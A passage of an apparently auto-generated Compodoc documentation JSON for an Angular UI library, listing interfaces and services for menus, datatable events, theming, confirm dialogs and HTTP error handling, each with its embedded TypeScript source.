      "sourceCode": "export type Menu = {\n  groups: MenuGroup[];\n} & Record<string, unknown>;\n\nexport interface MenuGroup {\n  hasDivider?: boolean;\n  icon?: string;\n  svgIcon?: boolean;\n  items: MenuItem[];\n  name?: string;\n}\n\nexport interface MenuItem {\n  id?: string;\n  name?: string;\n  icon?: string;\n  svgIcon?: boolean;\n  command?: MenuItemCommand;\n  error?: string;\n}\n\nexport interface MenuItemCommand {\n  type: MenuItemTypes;\n  /**\n   * For internal urls: RouterCommands.\n   * For external urls, should just be array with one element (the full url)\n   */\n  arguments: Array<string | number>;\n}\n\nexport interface NavigateCommand {\n  $event: MouseEvent | KeyboardEvent;\n  command?: Array<string | number>;\n}\n\nexport enum MenuItemTypes {\n  External = 'externalLink',\n  ExternalNew = 'externalLinkNewWindow',\n  Internal = 'internalLink',\n  Navigate = 'navigate'\n}\n",
      "properties": [
        {
          "name": "$event",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MouseEvent | KeyboardEvent",
          "optional": false,
          "description": "",
          "line": 32
        },
        {
          "name": "command",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Array<string | number>",
          "optional": true,
          "description": "",
          "line": 33
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": []
    },
    {
      "name": "RowActivation",
      "id": "interface-RowActivation-ea144294bd9add562c3834ee4283ecd1b5da45c74a70d0183ab65905ebc723213e782f4a42e57cdf3314d4bd8c9342b8ef92336e15362c9903f80263b1cedfcf",
      "file": "libs/datatable/src/lib/sto-datatable/events.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "import { Column } from './columns';\n\nexport interface ContextMenu {\n  event: MouseEvent | KeyboardEvent;\n  column: Column;\n}\n\ninterface RowCtx<T extends Record<string, unknown>> {\n  row: T;\n  index: number;\n}\n\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\nexport type HeaderContextMenu = ContextMenu;\n\ninterface Activate<T extends Record<string, unknown>> {\n  row: T;\n  event: MouseEvent | KeyboardEvent;\n  index: number;\n  rowEl?: HTMLDivElement;\n}\n\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\n  event: MouseEvent | KeyboardEvent;\n}\n\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\n  event: KeyboardEvent;\n}\n",
      "properties": [
        {
          "name": "event",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "KeyboardEvent",
          "optional": false,
          "description": "",
          "line": 28
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": [],
      "extends": "Activate"
    },
    {
      "name": "RowCtx",
      "id": "interface-RowCtx-ea144294bd9add562c3834ee4283ecd1b5da45c74a70d0183ab65905ebc723213e782f4a42e57cdf3314d4bd8c9342b8ef92336e15362c9903f80263b1cedfcf",
      "file": "libs/datatable/src/lib/sto-datatable/events.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "import { Column } from './columns';\n\nexport interface ContextMenu {\n  event: MouseEvent | KeyboardEvent;\n  column: Column;\n}\n\ninterface RowCtx<T extends Record<string, unknown>> {\n  row: T;\n  index: number;\n}\n\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\nexport type HeaderContextMenu = ContextMenu;\n\ninterface Activate<T extends Record<string, unknown>> {\n  row: T;\n  event: MouseEvent | KeyboardEvent;\n  index: number;\n  rowEl?: HTMLDivElement;\n}\n\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\n  event: MouseEvent | KeyboardEvent;\n}\n\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\n  event: KeyboardEvent;\n}\n",
      "properties": [
        {
          "name": "index",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 10
        },
        {
          "name": "row",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "T",
          "optional": false,
          "description": "",
          "line": 9
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": []
    },
    {
      "name": "RowSelection",
      "id": "interface-RowSelection-ea144294bd9add562c3834ee4283ecd1b5da45c74a70d0183ab65905ebc723213e782f4a42e57cdf3314d4bd8c9342b8ef92336e15362c9903f80263b1cedfcf",
      "file": "libs/datatable/src/lib/sto-datatable/events.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "import { Column } from './columns';\n\nexport interface ContextMenu {\n  event: MouseEvent | KeyboardEvent;\n  column: Column;\n}\n\ninterface RowCtx<T extends Record<string, unknown>> {\n  row: T;\n  index: number;\n}\n\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\nexport type HeaderContextMenu = ContextMenu;\n\ninterface Activate<T extends Record<string, unknown>> {\n  row: T;\n  event: MouseEvent | KeyboardEvent;\n  index: number;\n  rowEl?: HTMLDivElement;\n}\n\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\n  event: MouseEvent | KeyboardEvent;\n}\n\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\n  event: KeyboardEvent;\n}\n",
      "properties": [
        {
          "name": "event",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MouseEvent | KeyboardEvent",
          "optional": false,
          "description": "",
          "line": 24
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": [],
      "extends": "Activate"
    },
    {
      "name": "SortColumn",
      "id": "interface-SortColumn-341b2a910128d1bea9ab612612886e63623e53e1fae9027a60c25c129f815b0608d8dd2b904fabba194a1ec3080d76ea62d7fecba1608ca775335905332e6db5",
      "file": "libs/datatable/src/lib/sto-datatable/models.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "export interface SortColumn {\n  id: string;\n  sortDir: 'asc' | 'desc' | null;\n}\n\nexport type rowClassFn = <T>(row: T) => string;\n",
      "properties": [
        {
          "name": "id",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 2
        },
        {
          "name": "sortDir",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "\"asc\" | \"desc\" | null",
          "optional": false,
          "description": "",
          "line": 3
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": []
    },
    {
      "name": "StoErrorHandler",
      "id": "interface-StoErrorHandler-9a4092fb666179fac8a9fe58b5c082712782f54524bd848b041acefffff67a9bf041f2ae828003c1bacb8417305569cbe3d59a53975d8d122dabb84a89601f1d",
      "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\nimport { HttpError } from './http-error';\n\n/**\n * Public interface for the error handler class.\n */\nexport interface StoErrorHandler {\n  [ code: number ]: Handler;\n\n  getErrorText?: (err: HttpErrorResponse) => string;\n}\n\n/**\n * Internal interface for our errorhandler.\n */\nexport interface ErrorHandler extends StoErrorHandler {\n  handler: (err: HttpErrorResponse, handler?: Handler) => void;\n  defaultHandler: Handler;\n}\n\n/**\n * Interface for the ErrorLogger injection token.\n */\nexport interface ErrorLogger {\n  log: (arg0: HttpError) => void;\n}\n\n// Expected signature for error handlers.\nexport type Handler = (err: HttpErrorResponse) => HttpError;\n\n",
      "properties": [
        {
          "name": "getErrorText",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "function",
          "optional": true,
          "description": "",
          "line": 10
        }
      ],
      "indexSignatures": [
        {
          "id": "index-declaration-9a4092fb666179fac8a9fe58b5c082712782f54524bd848b041acefffff67a9bf041f2ae828003c1bacb8417305569cbe3d59a53975d8d122dabb84a89601f1d",
          "args": [
            {
              "name": "code",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "returnType": "Handler",
          "line": 7,
          "deprecated": false,
          "deprecationMessage": ""
        }
      ],
      "kind": 165,
      "description": "<p>Public interface for the error handler class.</p>\n",
      "rawdescription": "\n\nPublic interface for the error handler class.\n",
      "methods": []
    },
    {
      "name": "ThemeModel",
      "id": "interface-ThemeModel-c8ab7148137d698a0b1f467b0341799bbd267a735b1ddabfdd1730d81de9ecafeb6231dfa7db8fb211f5f909c77378d69696ef80d711b03519b989c95474a475",
      "file": "libs/common/src/lib/theme/models.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "export type ThemeName = 'light' | 'dark';\nexport type ThemeClassName = 'sto-light-theme' | 'sto-dark-theme';\nexport type TypographyName = 'small' | 'medium' | 'large';\nexport type TypographyClassName = 'sto-sm-typography' | 'sto-m-typography' | 'sto-l-typography';\n\nexport const themes = new Map<ThemeName, ThemeClassName>([\n  [ 'light', 'sto-light-theme' ],\n  [ 'dark', 'sto-dark-theme' ],\n]);\n\nexport const typography = new Map<TypographyName, TypographyClassName>([\n  [ 'small', 'sto-sm-typography' ],\n  [ 'medium', 'sto-m-typography' ],\n  [ 'large', 'sto-l-typography' ],\n]);\n\nexport interface ThemeModel<T = ThemeName | TypographyName> {\n  id?: string;\n  type: 'typography' | 'theme';\n  value: T;\n}\n",
      "properties": [
        {
          "name": "id",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 18
        },
        {
          "name": "type",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "\"typography\" | \"theme\"",
          "optional": false,
          "description": "",
          "line": 19
        },
        {
          "name": "value",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "T",
          "optional": false,
          "description": "",
          "line": 20
        }
      ],
      "indexSignatures": [],
      "kind": 165,
      "methods": []
    },
    {
      "name": "ThemeSaver",
      "id": "interface-ThemeSaver-4182d21ac72cc0f1436506bf222ee3fb19d625be207791f314fd0e1ea1e3e0d2942224d5732ae7333563f0b0377f713bb40c03f5a7a05e063a1ca72d27123e34",
      "file": "libs/common/src/lib/theme/theme-saver.service.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "interface",
      "sourceCode": "import { Injectable, InjectionToken } from '@angular/core';\nimport { ThemeModel, ThemeName, TypographyName } from './models';\nimport { Observable, of } from 'rxjs';\n\ntype ReturnValue<T> = Promise<T> | Observable<T> | T;\n\nexport interface ThemeSaver<T = ReturnValue<ThemeModel>> {\n  save(model: ThemeModel): T;\n\n  load(type?: 'typography' | 'theme'): T;\n\n  remove?(): ReturnValue<void>;\n}\n\nexport const THEME_SAVER = new InjectionToken<ThemeSaver>('sto__theme__typo');\n\n@Injectable({ providedIn: 'root' })\nexport class ThemeSaverService implements ThemeSaver {\n  load(type: 'typography' | 'theme'): Observable<ThemeModel> {\n    let value = localStorage.getItem('tops__' + type) as TypographyName | ThemeName;\n    if ( !value ) {\n      value = type === 'typography' ? 'medium' : 'light';\n    }\n    return of({ value, type });\n  }\n\n  save(model: ThemeModel): Observable<ThemeModel> {\n    localStorage.setItem('tops__' + model.type, model.value);\n    return of(model);\n  }\n}\n",
      "properties": [],
      "indexSignatures": [],
      "kind": 167,
      "methods": [
        {
          "name": "load",
          "args": [
            {
              "name": "type",
              "type": "\"typography\" | \"theme\"",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true
            }
          ],
          "optional": false,
          "returnType": "T",
          "typeParameters": [],
          "line": 10,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "type",
              "type": "\"typography\" | \"theme\"",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true,
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "remove",
          "args": [],
          "optional": true,
          "returnType": "ReturnValue<void>",
          "typeParameters": [],
          "line": 12,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "save",
          "args": [
            {
              "name": "model",
              "type": "ThemeModel",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "T",
          "typeParameters": [],
          "line": 8,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "model",
              "type": "ThemeModel",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ]
    }
  ],
  "injectables": [
    {
      "name": "ConfirmService",
      "id": "injectable-ConfirmService-088fd1f0ae4de6d7d7d8bb961ba05a5fea2cdd2cdf4078cc5c33b30fe2ac97a56bc28fcb368d44898348b0e94ea988317cffc1eddef717126e5d3613f89c80d6",
      "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts",
      "properties": [
        {
          "name": "ref",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MatDialogRef<ConfirmComponent> | null",
          "optional": false,
          "description": "",
          "line": 12,
          "modifierKind": [
            123
          ]
        }
      ],
      "methods": [
        {
          "name": "confirm",
          "args": [
            {
              "name": "message",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "title",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "'Confirm'"
            },
            {
              "name": "confirmText",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "'OK'"
            },
            {
              "name": "showCancel",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "true"
            },
            {
              "name": "options",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "dialogConfig"
            }
          ],
          "optional": false,
          "returnType": "Observable<boolean>",
          "typeParameters": [],
          "line": 17,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "message",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "title",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "'Confirm'",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "confirmText",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "'OK'",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "showCancel",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "true",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "options",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "dialogConfig",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { Injectable } from '@angular/core';\nimport { MatDialog, MatDialogConfig, MatDialogRef } from '@angular/material/dialog';\nimport { Observable, ReplaySubject } from 'rxjs';\nimport { ConfirmComponent } from './sto-confirm-dialog.component';\n\nconst dialogConfig = new MatDialogConfig();\ndialogConfig.width = '560px';\ndialogConfig.panelClass = 'sto-dialog';\n\n@Injectable()\nexport class ConfirmService {\n  public ref: MatDialogRef<ConfirmComponent> | null;\n\n  constructor(private dialog: MatDialog) {\n  }\n\n  confirm(message: string, title = 'Confirm', confirmText = 'OK', showCancel = true, options = dialogConfig): Observable<boolean> {\n    this.ref = this.dialog.open(ConfirmComponent, {\n      ...options,\n      data: { message, title, confirmText, showCancel }\n    });\n\n    const subject = new ReplaySubject<boolean>();\n\n    this.ref.afterClosed()\n      .subscribe(result => {\n        this.ref = null;\n        subject.next(result);\n        subject.complete();\n      });\n    return subject;\n  }\n\n}\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "dialog",
            "type": "MatDialog",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 12,
        "jsdoctags": [
          {
            "name": "dialog",
            "type": "MatDialog",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "type": "injectable"
    },
    {
      "name": "ErrorDialogService",
      "id": "injectable-ErrorDialogService-a94e0cc4b432af41371c03f03dd442709d7dc012c9316fed8d7d8855a5adf4a141ff72b8dbe0c3d4d45dfc8ca43c887ce2af66ef6123fbddae456c914d3dcedf",
      "file": "libs/error-handler/src/lib/error-handler/error-dialog.service.ts",
      "properties": [
        {
          "name": "ref",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MatDialogRef<DialogComponent>",
          "optional": false,
          "description": "",
          "line": 10,
          "modifierKind": [
            121
          ]
        }
      ],
      "methods": [
        {
          "name": "open",
          "args": [
            {
              "name": "err",
              "type": "HttpError",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "MatDialogRef<DialogComponent, >",
          "typeParameters": [],
          "line": 16,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpError",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { Injectable } from '@angular/core';\nimport { MatDialog, MatDialogRef } from '@angular/material/dialog';\nimport { HttpError } from './http-error';\nimport { DialogComponent } from './dialog/dialog.component';\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class ErrorDialogService {\n  private ref: MatDialogRef<DialogComponent>;\n\n  constructor(private dialog: MatDialog) {\n  }\n\n  // Opens a dialog, and returns the reference with the close results.\n  open(err: HttpError): MatDialogRef<DialogComponent, unknown> {\n    if ( this.ref ) {\n      this.ref.close(null);\n    }\n    this.ref = this.dialog.open(DialogComponent, {\n      data: err,\n      width: '560px',\n      autoFocus: false,\n      disableClose: true,\n      panelClass: 'sto-dialog'\n    });\n    return this.ref;\n  }\n}\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "dialog",
            "type": "MatDialog",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 10,
        "jsdoctags": [
          {
            "name": "dialog",
            "type": "MatDialog",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "type": "injectable"
    },
    {
      "name": "ErrorHandlerImpl",
      "id": "injectable-ErrorHandlerImpl-76dbeb67c05168c1d4f6862dbe89f181cf4f845ed02296a6bf6df841971cc943095e99b6be10c7e55350d83683723899f2846b7a0f07c70f177b522e799322a1",
      "file": "libs/error-handler/src/lib/wrapper.ts",
      "properties": [],
      "methods": [
        {
          "name": "401",
          "args": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 78,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { Component, Injectable, NgModule } from '@angular/core';\nimport { HttpClient, HttpClientModule, HttpErrorResponse } from '@angular/common/http';\nimport { CommonModule } from '@angular/common';\nimport { MatButtonModule } from '@angular/material/button';\nimport {\n  CUSTOM_ERROR_HANDLER, ERROR_LOGGER,\n  ErrorHandlerService,\n  Handler,\n  HttpError,\n  StoErrorHandler\n} from '@ngx-stoui/error-handler';\n\n@Component({\n  selector: 'next-wrapper',\n  template: `\n    <button mat-button\n            (click)=\"overRide(404)\">Overridden 404\n    </button>\n    <button mat-button\n            (click)=\"showError(s)\"\n            *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\n  `,\n  providers: []\n})\nexport class NextWrapperComponent {\n  public errors = [\n    0,\n    400,\n    401,\n    403,\n    404,\n    409,\n    500,\n    501,\n    503\n  ];\n\n  constructor(private service: ErrorHandlerService) {\n  }\n\n  showError(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    this.service.handler(err);\n  }\n\n  overRide(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    const handler = function (err: HttpErrorResponse) {\n      const e = new HttpError(err);\n      e.title = 'Local override 404';\n      e.text = 'Local override not found item';\n      return e;\n    };\n    this.service.handler(err, handler);\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class ErrorHandlerImpl implements StoErrorHandler {\n  [ code: number ]: Handler;\n\n  401(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'Custom not signed in';\n    error.text = 'Custom not signed in text';\n    return error;\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class Logger {\n  constructor(private http: HttpClient) {\n  }\n\n  log(err: HttpError) {\n    // This method will typically go to the application backend or a central log repository\n    console.log('Error', err);\n  }\n}\n\nfunction LoggerFactory(http: HttpClient) {\n  return new Logger(http);\n}\n\n@NgModule({\n  declarations: [ NextWrapperComponent ],\n  imports: [ CommonModule, MatButtonModule, HttpClientModule ],\n  exports: [ NextWrapperComponent ],\n  providers: [\n    { provide: CUSTOM_ERROR_HANDLER, useClass: ErrorHandlerImpl },\n    { provide: ERROR_LOGGER, useFactory: LoggerFactory, deps: [ HttpClient ] }\n  ]\n})\nexport class WrapperModule {\n}\n\n",
      "type": "injectable"
    },
    {
      "name": "ErrorHandlerService",
      "id": "injectable-ErrorHandlerService-0ad3237e895725c5281b9087560fd9a85b5c21b1c1ec21e1a8fdeb9cbb3d36519dc9fa6bef52e582b05f4c1807105b36b0463f23e38ac627b7d9285934a75645",
      "file": "libs/error-handler/src/lib/error-handler/error-handler.service.ts",
      "properties": [],
      "methods": [
        {
          "name": "0",
          "args": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 72,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "400",
          "args": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 87,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "401",
          "args": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 97,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "403",
          "args": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 105,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "404",
          "args": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 116,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "409",
          "args": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 127,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "500",
          "args": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 140,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "501",
          "args": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 153,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "503",
          "args": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 157,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "defaultHandler",
          "args": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 57,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "getErrorText",
          "args": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 167,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nUses the getErrorText from the provided custom handler, if available.\nOtherwise, return the error message, if available in our desired format\nExpected err.error -> { message: 'A message', ... }\nAlso handles text as a fallback.\n",
          "description": "<p>Uses the getErrorText from the provided custom handler, if available.\nOtherwise, return the error message, if available in our desired format\nExpected err.error -&gt; { message: &#39;A message&#39;, ... }\nAlso handles text as a fallback.</p>\n",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "handler",
          "args": [
            {
              "name": "err",
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "handler",
              "type": "Handler",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 31,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nGlobal handler. This method will try (in order): passed in handler -> custom handler -> default handler for code -> defaultHandler\nAll errors are passed to a dialog to be displayed there, and will by default have a simple \"OK\" button to close.\n",
          "description": "<p>Global handler. This method will try (in order): passed in handler -&gt; custom handler -&gt; default handler for code -&gt; defaultHandler\nAll errors are passed to a dialog to be displayed there, and will by default have a simple &quot;OK&quot; button to close.</p>\n",
          "jsdoctags": [
            {
              "name": {
                "pos": 1174,
                "end": 1177,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "err"
              },
              "type": "HttpErrorResponse",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 1168,
                "end": 1173,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": ""
            },
            {
              "name": {
                "pos": 1190,
                "end": 1197,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "handler"
              },
              "type": "Handler",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true,
              "tagName": {
                "pos": 1184,
                "end": 1189,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": ""
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
